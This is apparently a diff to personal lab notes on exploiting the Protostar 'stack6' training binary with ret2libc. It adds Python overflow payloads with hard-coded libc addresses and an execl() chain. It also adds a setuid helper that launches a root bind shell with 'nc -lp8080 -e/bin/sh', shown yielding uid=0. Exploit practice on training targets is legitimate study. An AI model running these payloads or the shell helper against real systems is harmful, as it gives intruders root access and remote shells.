@@ -14,7 +14,7 @@ Ret2LibC   |
 http://www.win.tue.nl/~aeb/linux/hh/hh-10.html  (section 10.4)
 Performing a ret2libc Attack - Defeating a non-executable stack (InVoLuNTaRy)
 
-Payload: |"A" * 80| exit() address | system() address | ENV var address |
+Payload: |"A" * 80|  system() address | exit() address | ENV var address |
 
 user@protostar:~$ export TEST=whoami
 user@protostar:~$ cd /opt/protostar/bin/
@@ -28,6 +28,7 @@ user@protostar:/opt/protostar/bin$
 
 
 Method 1)
+=============
 - will execute system("env var") then exit(). 
 - system("/bin/sh") not working because bash drops priviledges (man bash)
 - use a shellcode instead to exec /bin/sh. 
@@ -44,5 +45,49 @@ root
 # 
 
 Method 2)
+=============
 - instead of fav use other binary (to open a network socket, etc...)
 
+user@protostar:~$ cd ~
+user@protostar:~$ vim fav2.c
+#include <stdlib.h>
+
+int main(int argc, char **argv, char **envp) {
+	setuid(0); // These two are necessary, as system() drops privileges
+	setgid(0);
+	char *args[] = {  "nc", "-lp8080", "-e/bin/sh", (char *) 0 };
+	execve("/bin/nc", args, envp);
+}
+
+user@protostar:~$ gcc -o fav2 fav2.c 
+user@protostar:~$ cd /opt/protostar/bin/
+user@protostar:/opt/protostar/bin$ export FAV="/home/user/fav2
+fav2    fav2.c  
+user@protostar:/opt/protostar/bin$ export FAV="/home/user/fav2"
+user@protostar:/opt/protostar/bin$ ~/getenvaddr FAV ./stack6
+FAV will be at 0xbfffff57
+user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\x57\xff\xff\xbf"' | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��W���
+
+In another terminal:
+# nc 172.16.121.129 8080
+id
+uid=0(root) gid=0(root) groups=0(root),1001(user)
+whoami
+root
+
+Method 3)
+=============
+The execl method from Hacker's Hut (but we cn do easier without printf, if we overcome the '0' parameter problem in another way):
+
+Try with this payload: |"A" * 80| execl() address | exit() address | fav | fav | envp |
+- fav is in environment variable 
+    user@protostar:/opt/protostar/bin$ export FAV="/home/user/fav2"
+    user@protostar:/opt/protostar/bin$ ~/getenvaddr FAV ./stack6
+    FAV will be at 0xbfffff57
+- envp must be a NULL terminated array of environment variables. To be sure we have that, we can pass the address of FAV env variable also.
+
+$ python -c 'print "A" * 80 + "\x60\xe4\xf2\xb7" + "\xc0\x60\xec\xb7" + "\x57\xff\xff\xbf" + "\x57\xff\xff\xbf" + "\x57\xff\xff\xbf" ' | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���AAAAAAAAAAAA`����`��W���W���W���
+
+And we have an nc listener that executes bash:)
